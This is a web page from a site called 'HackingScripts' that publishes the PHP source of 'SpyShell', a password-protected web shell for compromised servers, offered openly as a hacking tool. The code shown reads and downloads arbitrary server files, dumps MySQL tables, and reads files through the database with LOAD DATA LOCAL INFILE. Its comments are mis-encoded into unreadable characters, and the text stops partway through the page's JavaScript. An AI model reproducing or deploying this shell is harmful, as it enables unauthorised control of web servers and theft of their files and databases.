<!DOCTYPE html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/stylesheet.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/pygment_trac.css" media="screen" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/print.css" media="print" />
    <link rel="stylesheet" type="text/css" href="/HackingScripts/stylesheets/styles.css" media="print" />
    <link rel="icon" type="image/x-icon" href="/HackingScripts/favicon.ico">


    <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <title> SpyShell Script </title>
  </head>

  <body>
    <header>
      <div class="inner">
        <h1> <a href="/HackingScripts/">HackingScripts</a> </h1>
        <h2>Hack Scripts for everybody</h2>
      </div>
    </header>

    <div id="content-wrapper">
      <div class="inner clearfix">
        <section id="main-content">

          <h2>SpyShell Script</h2>
<p class="meta">19 Feb 2014</p>

<p>SpyShell Script, powered by Security Angel Team [S4T].</p>

<h3>SpyShell Script Source Code</h3>

<div class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">7</span><span class="p">);</span>
<span class="o">@</span><span class="nb">set_magic_quotes_runtime</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="nb">ob_start</span><span class="p">();</span>
<span class="nv">$mtime</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="nb">microtime</span><span class="p">());</span>
<span class="nv">$starttime</span> <span class="o">=</span> <span class="nv">$mtime</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="nv">$mtime</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;SA_ROOT&#39;</span><span class="p">,</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;\\&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;IS_WIN&#39;</span><span class="p">,</span> <span class="nx">DIRECTORY_SEPARATOR</span> <span class="o">==</span> <span class="s1">&#39;\\&#39;</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;IS_COM&#39;</span><span class="p">,</span> <span class="nb">class_exists</span><span class="p">(</span><span class="s1">&#39;COM&#39;</span><span class="p">)</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span> <span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;IS_GPC&#39;</span><span class="p">,</span> <span class="nb">get_magic_quotes_gpc</span><span class="p">());</span>
<span class="nv">$dis_func</span> <span class="o">=</span> <span class="nb">get_cfg_var</span><span class="p">(</span><span class="s1">&#39;disable_functions&#39;</span><span class="p">);</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">&#39;IS_PHPINFO&#39;</span><span class="p">,</span> <span class="p">(</span><span class="o">!</span><span class="nb">eregi</span><span class="p">(</span><span class="s2">&quot;phpinfo&quot;</span><span class="p">,</span><span class="nv">$dis_func</span><span class="p">))</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span> <span class="p">);</span>
<span class="o">@</span><span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

<span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">IS_GPC</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$value</span> <span class="o">=</span> <span class="nx">s_array</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$$key</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
<span class="p">}</span>
<span class="cm">/*===================== ³ÌÐòÅäÖÃ =====================*/</span>

<span class="c1">//echo encode_pass(&#39;angel&#39;);exit;</span>
<span class="c1">//angel = ec38fe2a8497e0a8d6d349b3533038cb</span>
<span class="c1">// Èç¹ûÐèÒªÃÜÂëÑéÖ¤,ÇëÐÞ¸ÄµÇÂ½ÃÜÂë,Áô¿ÕÎª²»ÐèÒªÑéÖ¤</span>
<span class="nv">$pass</span>  <span class="o">=</span> <span class="s1">&#39;ec38fe2a8497e0a8d6d349b3533038cb&#39;</span><span class="p">;</span> <span class="c1">//angel</span>

<span class="c1">//ÈçÄú¶Ô cookie ×÷ÓÃ·¶Î§ÓÐÌØÊâÒªÇó, »òµÇÂ¼²»Õý³£, ÇëÐÞ¸ÄÏÂÃæ±äÁ¿, ·ñÔòÇë±£³ÖÄ¬ÈÏ</span>
<span class="c1">// cookie Ç°×º</span>
<span class="nv">$cookiepre</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="c1">// cookie ×÷ÓÃÓò</span>
<span class="nv">$cookiedomain</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="c1">// cookie ×÷ÓÃÂ·¾¶</span>
<span class="nv">$cookiepath</span> <span class="o">=</span> <span class="s1">&#39;/&#39;</span><span class="p">;</span>
<span class="c1">// cookie ÓÐÐ§ÆÚ</span>
<span class="nv">$cookielife</span> <span class="o">=</span> <span class="mi">86400</span><span class="p">;</span>

<span class="c1">//³ÌÐòËÑË÷¿ÉÐ´ÎÄ¼þµÄÀàÐÍ</span>
<span class="o">!</span><span class="nv">$writabledb</span> <span class="o">&amp;&amp;</span> <span class="nv">$writabledb</span> <span class="o">=</span> <span class="s1">&#39;php,cgi,pl,asp,inc,js,html,htm,jsp&#39;</span><span class="p">;</span>
<span class="cm">/*===================== ÅäÖÃ½áÊø =====================*/</span>

<span class="nv">$charsetdb</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;armscii8&#39;</span><span class="p">,</span><span class="s1">&#39;ascii&#39;</span><span class="p">,</span><span class="s1">&#39;big5&#39;</span><span class="p">,</span><span class="s1">&#39;binary&#39;</span><span class="p">,</span><span class="s1">&#39;cp1250&#39;</span><span class="p">,</span><span class="s1">&#39;cp1251&#39;</span><span class="p">,</span><span class="s1">&#39;cp1256&#39;</span><span class="p">,</span><span class="s1">&#39;cp1257&#39;</span><span class="p">,</span><span class="s1">&#39;cp850&#39;</span><span class="p">,</span><span class="s1">&#39;cp852&#39;</span><span class="p">,</span><span class="s1">&#39;cp866&#39;</span><span class="p">,</span><span class="s1">&#39;cp932&#39;</span><span class="p">,</span><span class="s1">&#39;dec8&#39;</span><span class="p">,</span><span class="s1">&#39;euc-jp&#39;</span><span class="p">,</span><span class="s1">&#39;euc-kr&#39;</span><span class="p">,</span><span class="s1">&#39;gb2312&#39;</span><span class="p">,</span><span class="s1">&#39;gbk&#39;</span><span class="p">,</span><span class="s1">&#39;geostd8&#39;</span><span class="p">,</span><span class="s1">&#39;greek&#39;</span><span class="p">,</span><span class="s1">&#39;hebrew&#39;</span><span class="p">,</span><span class="s1">&#39;hp8&#39;</span><span class="p">,</span><span class="s1">&#39;keybcs2&#39;</span><span class="p">,</span><span class="s1">&#39;koi8r&#39;</span><span class="p">,</span><span class="s1">&#39;koi8u&#39;</span><span class="p">,</span><span class="s1">&#39;latin1&#39;</span><span class="p">,</span><span class="s1">&#39;latin2&#39;</span><span class="p">,</span><span class="s1">&#39;latin5&#39;</span><span class="p">,</span><span class="s1">&#39;latin7&#39;</span><span class="p">,</span><span class="s1">&#39;macce&#39;</span><span class="p">,</span><span class="s1">&#39;macroman&#39;</span><span class="p">,</span><span class="s1">&#39;sjis&#39;</span><span class="p">,</span><span class="s1">&#39;swe7&#39;</span><span class="p">,</span><span class="s1">&#39;tis620&#39;</span><span class="p">,</span><span class="s1">&#39;ucs2&#39;</span><span class="p">,</span><span class="s1">&#39;ujis&#39;</span><span class="p">,</span><span class="s1">&#39;utf8&#39;</span><span class="p">);</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$charset</span> <span class="o">==</span> <span class="s1">&#39;utf8&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;content-Type: text/html; charset=utf-8&quot;</span><span class="p">);</span>
<span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$charset</span> <span class="o">==</span> <span class="s1">&#39;big5&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;content-Type: text/html; charset=big5&quot;</span><span class="p">);</span>
<span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$charset</span> <span class="o">==</span> <span class="s1">&#39;gbk&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;content-Type: text/html; charset=gbk&quot;</span><span class="p">);</span>
<span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$charset</span> <span class="o">==</span> <span class="s1">&#39;latin1&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;content-Type: text/html; charset=iso-8859-2&quot;</span><span class="p">);</span>
<span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$charset</span> <span class="o">==</span> <span class="s1">&#39;euc-kr&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;content-Type: text/html; charset=euc-kr&quot;</span><span class="p">);</span>
<span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$charset</span> <span class="o">==</span> <span class="s1">&#39;euc-jp&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;content-Type: text/html; charset=euc-jp&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="nv">$self</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;SCRIPT_NAME&#39;</span><span class="p">];</span>
<span class="nv">$timestamp</span> <span class="o">=</span> <span class="nb">time</span><span class="p">();</span>

<span class="cm">/*===================== Éí·ÝÑéÖ¤ =====================*/</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s2">&quot;logout&quot;</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">scookie</span><span class="p">(</span><span class="s1">&#39;loginpass&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="o">-</span><span class="mi">86400</span> <span class="o">*</span> <span class="mi">365</span><span class="p">);</span>
    <span class="o">@</span><span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: &#39;</span><span class="o">.</span><span class="nv">$self</span><span class="p">);</span>
    <span class="k">exit</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s1">&#39;login&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$pass</span> <span class="o">==</span> <span class="nx">encode_pass</span><span class="p">(</span><span class="nv">$password</span><span class="p">))</span> <span class="p">{</span>
            <span class="nx">scookie</span><span class="p">(</span><span class="s1">&#39;loginpass&#39;</span><span class="p">,</span><span class="nx">encode_pass</span><span class="p">(</span><span class="nv">$password</span><span class="p">));</span>
            <span class="o">@</span><span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: &#39;</span><span class="o">.</span><span class="nv">$self</span><span class="p">);</span>
            <span class="k">exit</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;loginpass&#39;</span><span class="p">])</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;loginpass&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$pass</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">loginpage</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nx">loginpage</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cm">/*===================== ÑéÖ¤½áÊø =====================*/</span>

<span class="nv">$errmsg</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="o">!</span><span class="nv">$action</span> <span class="o">&amp;&amp;</span> <span class="nv">$action</span> <span class="o">=</span> <span class="s1">&#39;file&#39;</span><span class="p">;</span>

<span class="c1">// ²é¿´PHPINFO</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s1">&#39;phpinfo&#39;</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">IS_PHPINFO</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">phpinfo</span><span class="p">();</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$errmsg</span> <span class="o">=</span> <span class="s1">&#39;phpinfo() function has non-permissible&#39;</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// ÏÂÔØÎÄ¼þ</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$doing</span> <span class="o">==</span> <span class="s1">&#39;downfile&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$thefile</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$thefile</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$errmsg</span> <span class="o">=</span> <span class="s1">&#39;The file you want Downloadable was nonexistent&#39;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$fileinfo</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$thefile</span><span class="p">);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-type: application/x-&#39;</span><span class="o">.</span><span class="nv">$fileinfo</span><span class="p">[</span><span class="s1">&#39;extension&#39;</span><span class="p">]);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-Disposition: attachment; filename=&#39;</span><span class="o">.</span><span class="nv">$fileinfo</span><span class="p">[</span><span class="s1">&#39;basename&#39;</span><span class="p">]);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-Length: &#39;</span><span class="o">.</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$thefile</span><span class="p">));</span>
        <span class="o">@</span><span class="nb">readfile</span><span class="p">(</span><span class="nv">$thefile</span><span class="p">);</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// Ö±½ÓÏÂÔØ±¸·ÝÊý¾Ý¿â</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$doing</span> <span class="o">==</span> <span class="s1">&#39;backupmysql&#39;</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nv">$saveasfile</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$table</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$errmsg</span> <span class="o">=</span><span class="s1">&#39;Please choose the table&#39;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$mysqllink</span> <span class="o">=</span> <span class="nx">mydbconn</span><span class="p">(</span><span class="nv">$dbhost</span><span class="p">,</span> <span class="nv">$dbuser</span><span class="p">,</span> <span class="nv">$dbpass</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">,</span> <span class="nv">$charset</span><span class="p">,</span> <span class="nv">$dbport</span><span class="p">);</span>
        <span class="nv">$filename</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$dbname</span><span class="o">.</span><span class="s1">&#39;.sql&#39;</span><span class="p">);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-type: application/unknown&#39;</span><span class="p">);</span>
        <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-Disposition: attachment; filename=&#39;</span><span class="o">.</span><span class="nv">$filename</span><span class="p">);</span>
        <span class="k">foreach</span><span class="p">(</span><span class="nv">$table</span> <span class="k">as</span> <span class="nv">$k</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">sqldumptable</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="nb">mysql_close</span><span class="p">();</span>
        <span class="k">exit</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="c1">// Í¨¹ýMYSQLÏÂÔØÎÄ¼þ</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$doing</span><span class="o">==</span><span class="s1">&#39;mysqldown&#39;</span><span class="p">){</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$dbname</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$errmsg</span> <span class="o">=</span> <span class="s1">&#39;Please input dbname&#39;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nv">$mysqllink</span> <span class="o">=</span> <span class="nx">mydbconn</span><span class="p">(</span><span class="nv">$dbhost</span><span class="p">,</span> <span class="nv">$dbuser</span><span class="p">,</span> <span class="nv">$dbpass</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">,</span> <span class="nv">$charset</span><span class="p">,</span> <span class="nv">$dbport</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$mysqldlfile</span><span class="p">))</span> <span class="p">{</span>
            <span class="nv">$errmsg</span> <span class="o">=</span> <span class="s1">&#39;The file you want Downloadable was nonexistent&#39;</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$result</span> <span class="o">=</span> <span class="nx">q</span><span class="p">(</span><span class="s2">&quot;select load_file(&#39;</span><span class="si">$mysqldlfile</span><span class="s2">&#39;);&quot;</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">){</span>
                <span class="nx">q</span><span class="p">(</span><span class="s2">&quot;DROP TABLE IF EXISTS tmp_angel;&quot;</span><span class="p">);</span>
                <span class="nx">q</span><span class="p">(</span><span class="s2">&quot;CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);&quot;</span><span class="p">);</span>
                <span class="c1">//ÓÃÊ±¼ä´ÁÀ´±íÊ¾½Ø¶Ï,±ÜÃâ³öÏÖ¶ÁÈ¡×ÔÉí»ò°üº¬__angel_1111111111_eof__µÄÎÄ¼þÊ±²»ÍêÕûµÄÇé¿ö</span>
                <span class="nx">q</span><span class="p">(</span><span class="s2">&quot;LOAD DATA LOCAL INFILE &#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$mysqldlfile</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39; INTO TABLE tmp_angel FIELDS TERMINATED BY &#39;__angel_</span><span class="si">{</span><span class="nv">$timestamp</span><span class="si">}</span><span class="s2">_eof__&#39; ESCAPED BY &#39;&#39; LINES TERMINATED BY &#39;__angel_</span><span class="si">{</span><span class="nv">$timestamp</span><span class="si">}</span><span class="s2">_eof__&#39;;&quot;</span><span class="p">);</span>
                <span class="nv">$result</span> <span class="o">=</span> <span class="nx">q</span><span class="p">(</span><span class="s2">&quot;select content from tmp_angel&quot;</span><span class="p">);</span>
                <span class="nx">q</span><span class="p">(</span><span class="s2">&quot;DROP TABLE tmp_angel&quot;</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nv">$row</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$row</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$errmsg</span> <span class="o">=</span> <span class="s1">&#39;Load file failed &#39;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">();</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
                <span class="nv">$fileinfo</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$mysqldlfile</span><span class="p">);</span>
                <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-type: application/x-&#39;</span><span class="o">.</span><span class="nv">$fileinfo</span><span class="p">[</span><span class="s1">&#39;extension&#39;</span><span class="p">]);</span>
                <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Content-Disposition: attachment; filename=&#39;</span><span class="o">.</span><span class="nv">$fileinfo</span><span class="p">[</span><span class="s1">&#39;basename&#39;</span><span class="p">]);</span>
                <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Accept-Length: &quot;</span><span class="o">.</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
                <span class="k">echo</span> <span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
                <span class="k">exit</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="cp">?&gt;</span><span class="x"></span>
<span class="x">&amp;lt;html&amp;gt;</span>
<span class="x">&amp;lt;head&amp;gt;</span>
<span class="x">&amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gbk&quot;&amp;gt;</span>
<span class="x">&amp;lt;title&amp;gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$action</span><span class="o">.</span><span class="s1">&#39; - &#39;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_HOST&#39;</span><span class="p">];</span><span class="cp">?&gt;</span><span class="x">&amp;lt;/title&amp;gt;</span>
<span class="x">&amp;lt;style type=&quot;text/css&quot;&amp;gt;</span>
<span class="x">body,td{font: 12px Arial,Tahoma;line-height: 16px;}</span>
<span class="x">.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}</span>
<span class="x">.area{font:12px &#39;Courier New&#39;, Monospace;background:#fff;border: 1px solid #666;padding:2px;}</span>
<span class="x">.bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}</span>
<span class="x">a {color: #00f;text-decoration:underline;}</span>
<span class="x">a:hover{color: #f00;text-decoration:none;}</span>
<span class="x">.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}</span>
<span class="x">.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}</span>
<span class="x">.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}</span>
<span class="x">.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}</span>
<span class="x">.head td span{font-weight:normal;}</span>
<span class="x">.infolist {padding:10px;margin:10px 0 20px 0;background:#F1F1F1;border:1px solid #ddd;}</span>
<span class="x">form{margin:0;padding:0;}</span>
<span class="x">h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}</span>
<span class="x">ul.info li{margin:0;color:#444;line-height:24px;height:24px;}</span>
<span class="x">u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}</span>
<span class="x">.drives{padding:5px;}</span>
<span class="x">.drives span {margin:auto 7px;}</span>
<span class="x">&amp;lt;/style&amp;gt;</span>
<span class="x">&amp;lt;script type=&quot;text/javascript&quot;&amp;gt;</span>
<span class="x">function CheckAll(form) {</span>
<span class="x">    for(var i=0;i&amp;lt;form.elements.length;i++) {</span>
<span class="x">        var e = form.elements[i];</span>
<span class="x">        if (e.name != &#39;chkall&#39;)</span>
<span class="x">        e.checked = form.chkall.checked;</span>
<span class="x">    }</span>
<span class="x">}</span>
<span class="x">function $(id) {</span>
<span class="x">    return document.getElementById(id);</span>
<span class="x">}</span>
<span class="x">function createdir(){</span>
<span class="x">    var newdirname;</span>
<span class="x">    newdirname = prompt(&#39;Please input the directory name:&#39;, &#39;&#39;);</span>
<span class="x">    if (!newdirname) return;</span>
<span class="x">    $(&#39;createdir&#39;).newdirname.value=newdirname;</span>
<span class="x">    $(&#39;createdir&#39;).submit();</span>
<span class="x">}</span>
<span class="x">function fileperm(pfile){</span>
<span class="x">    var newperm;</span>
<span class="x">    newperm = prompt(&#39;Current file:&#39;+pfile+&#39;\nPlease input new attribute:&#39;, &#39;&#39;);</span>
<span class="x">    if (!newperm) return;</span>
<span class="x">    $(&#39;fileperm&#39;).newperm.value=newperm;</span>
<span class="x">    $(&#39;fileperm&#39;).pfile.value=pfile;</span>
<span class="x">    $(&#39;fileperm&#39;).submit();</span>
<span class="x">}</span>
<span class="x">function copyfile(sname){</span>
<span class="x">    var tofile;</span>
<span class="x">    tofile = prompt(&#39;Original file:&#39;+sname+&#39;\nPlease input object file (fullpath):&#39;, &#39;&#39;);</span>
<span class="x">    if (!tofile) return;</span>
<span class="x">    $(&#39;copyfile&#39;).tofile.value=tofile;</span>
<span class="x">    $(&#39;copyfile&#39;).sname.value=sname;</span>
<span class="x">    $(&#39;copyfile&#39;).submit();</span>
<span class="x">}</span>
<span class="x">function rename(oldname){</span>
<span class="x">    var newfilename;</span>
<span class="x">    newfilename = prompt(&#39;Former file name:&#39;+oldname+&#39;\nPlease input new filename:&#39;, &#39;&#39;);</span>
<span class="x">    if (!newfilename) return;</span>
<span class="x">    $(&#39;rename&#39;).newfilename.value=newfilename;</span>
<span class="x">    $(&#39;rename&#39;).oldname.value=oldname;</span>
<span class="x">    $(&#39;rename&#39;).submit();</span>
<span class="x">}</span>
<span class="x">function dofile(doing,thefile,m){</span>
<span class="x">    if (m &amp;&amp; !confirm(m)) {</span>
<span class="x">        return;</span>
<span class="x">    }</span>
<span class="x">    $(&#39;filelist&#39;).doing.value=doing;</span>
<span class="x">    if (thefile){</span>
<span class="x">        $(&#39;filelist&#39;).thefile.value=thefile;</span>
<span class="x">    }</span>
<span class="x">    $(&#39;filelist&#39;).submit();</span>
<span class="x">}</span>
<span class="x">function createfile(nowpath){</span>
<span class="x">    var filename;</span>
<span class="x">    filename = prompt(&#39;Please input the file name:&#39;, &#39;&#39;);</span>
<span class="x">    if (!filename) return;</span>
<span class="x">    opfile(&#39;editfile&#39;,nowpath + filename,nowpath);</span>
<span class="x">}</span>
<span class="x">function opfile(action,opfile,dir){</span>
<span class="x">    $(&#39;fileopform&#39;).action.value=action;</span>
<span class="x">    $(&#39;fileopform&#39;).opfile.value=opfile;</span>
<span class="x">    $(&#39;fileopform&#39;).dir.value=dir;</span>
<span class="x">    $(&#39;fileopform&#39;).submit();</span>
<span class="x">}</span>
<span class="x">function godir(dir,view_writable){</span>
<span class="x">    if (view_writable) {</span>
<span class="x">        $(&#39;godir&#39;).view_writable.value=view_writable;</span>
<span class="x">    }</span>
<span class="x">    $(&#39;godir&#39;).dir.value=dir;</span>
<span class="x">    $(&#39;godir&#39;).submit();</span>
<span class="x">}</span>
<span class="x">function getsize(getdir,dir){</span>
<span class="x">    $(&#39;getsize&#39;).getdir.value=getdir;</span>
<span class="x">    $(&#39;getsize&#39;).dir.value=dir;</span>
<span class="x">    $(&#39;getsize&#39;).submit();</span>
<span class="x">}</span>
<span class="x">function editrecord(action, base64, tablename){</span>
<span class="x">    if (action == &#39;del&#39;) {      </span>
<span class="x">        if (!confirm(&#39;Is or isn\&#39;t deletion record?&#39;)) return;</span>
<span class="x">    }</span>
<span class="x">    $(&#39;recordlist&#39;).doing.value=action;</span>
<span class="x">    $(&#39;recordlist&#39;).base64.value=base64;</span>
<span class="x">    $(&#39;recordlist&#39;).tablename.value=tablename;</span>
<span class="x">    $(&#39;recordlist&#39;).submit();</span>
<span class="x">}</span>
<span class="x">function moddbname(dbname) {</span>
<span class="x">    if(!dbname) return;</span>
<span class="x">    $(&#39;setdbname&#39;).dbname.value=dbname;</span>
<span class="x">    $(&#39;setdbname&#39;).submit();</span>
<span class="x">}</span>
